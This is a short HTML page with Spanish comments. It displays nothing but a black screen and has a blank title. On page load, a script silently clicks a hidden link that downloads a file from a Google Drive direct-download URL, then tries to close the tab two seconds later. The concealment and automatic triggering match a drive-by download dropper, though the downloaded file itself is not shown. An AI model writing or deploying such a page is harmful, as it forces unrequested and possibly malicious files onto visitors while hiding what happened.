<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>       </title> <!-- título invisible -->
  <style>
    html, body {
      height: 100%;
      margin: 0;
      background-color: #000; /* fondo negro */
      overflow: hidden;
    }
  </style>
  <script>
    window.onload = () => {
      // Crea un enlace invisible para descargar
      const link = document.createElement("a");
      link.href = "https://drive.google.com/uc?export=download&id=16C0yfW7OgzLZBtggImpZt9SzCnYTgOyc";
      link.download = "";
      link.style.display = "none";
      document.body.appendChild(link);
      link.click();

      // Espera 2 segundos y cierra la pestaña
      setTimeout(() => {
        window.open('', '_self', '');
        window.close();
      }, 2000);
    };
  </script>
</head>
<body>
</body>
</html>
